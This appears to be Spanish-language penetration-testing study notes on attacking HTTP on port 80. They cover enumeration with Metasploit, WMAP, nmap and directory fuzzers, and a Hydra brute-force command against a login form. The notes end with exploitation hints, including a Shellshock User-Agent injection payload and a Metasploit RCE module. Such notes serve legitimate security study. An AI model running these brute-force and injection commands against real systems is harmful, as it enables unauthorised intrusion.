# HTTP (80)

# **🔍** Enumeración HTTP

## **Metasploit:**

- `auxiliary/scanner/http/http_version`: Obtiene banner y versión.
- `auxiliary/scanner/http/robots_txt`: Muestra `robots.txt`.
- `auxiliary/scanner/http/http_header`: Muestra cabeceras (headers).
- `auxiliary/scanner/http/brute_dirs`, `dir_scanner`: Fuerza bruta de directorios.
- `auxiliary/scanner/http/files_dir`: Busca archivos/directorios específicos.

## Plugin WMAP:

1. `load wmap` Cargamos plugin wmap en Metasploit
2. `wmap_sites -a "ip"` Indicamos la IP víctima
3. `wmap_targets -t "http://ip"` Indicamos URL víctima
4. `wmap_sites -l` Listar configuración de sitios
5. `wmap_run -t` Prueba que módulos se pueden lanzar
6. `wmap_run -e` Ejecutamos módulos previos

## **Tecnología Web:**

- `whatweb <ip>`: Lista tecnologías (CMS, servidor, lenguaje).
- `http <ip>`: Muestra cabeceras, tokens, cookies y cuerpo.

## **Fuzzing (Directorios Ocultos):**

### Gobuster

- `gobuster dir -u <url> -c 'session=<cookie>' -t <threads> -w <diccionario>`

### Feroxbuster

- `feroxbuster --url <URI> --wordlist <diccionario> --depth <nivel>`

### Dirsearch

- `dirsearch.py -u <url> -w <diccionario>`

### Dirb

- `dirb <URI>` Explorar Directorios y sus subdirectorios
- `dirb <URI> -w /usr/share/dirb/wordlists/big.txt -X <extensiones>` Explorar archivos con cierta extensión
- `-u user:pass`   Para indicar login

**Diccionarios recomendados:**

- `/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt`
- `/usr/share/metasploit-framework/data/wordlists/directory.txt`

## **Nmap:**

- `nmap -Pn -p 80 --script http-enum <ip>`: Fuzzing de directorios comunes.
- `nmap -Pn -p 80 --script http-headers <ip>`: Obtiene cabeceras.
- `nmap -Pn -p 80 --script http-methods <ip>`: Obtiene métodos (GET, POST, PUT…).
- `nmap -Pn -p 80 --script http-webdav-scan <ip>`: Escanea WebDAV.
- `nmap -Pn -p 80 --script banner <ip>`: Banner grabbing.

## **Otras Herramientas:**

- `curl <url> | more`: Obtiene la respuesta (HTML) para inspección manual.

# ⌨️ Acceso HTTP

### **Metasploit:**

- `auxiliary/scanner/http/http_put`: Intenta subir un archivo (método PUT).
- `auxiliary/scanner/http/http_login`: Fuerza bruta contra un formulario de login.

## Fuerza Bruta Login

### HYDRA

```jsx
hydra -L 
"diccionario_users.txt" -P 
"diccionario_pass.txt" ip_victima
http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid 
username or password"
```

# 💥 Explotación HTTP

### **Apache (Puerto 80/ 443)**

- **XDebug:** Si `phpinfo.php` muestra XDebug habilitado, buscar módulo de Metasploit para RCE.

### **Shellshock (CGI):** Vulnerabilidad en Bash que afecta a scripts CGI.

- *Detección:* `nmap -Pn -p 80 <IP> --script http-shellshock --script-args http-shellshock.uri=/ruta/script.cgi`
- *Explotación Manual (Burp):* Inyectar en User-Agent: `() {:;}; echo; echo; /bin/bash -c '<comando>'`
- *Metasploit:* `exploit/multi/http/apache_mod_cgi_bash_env_exec`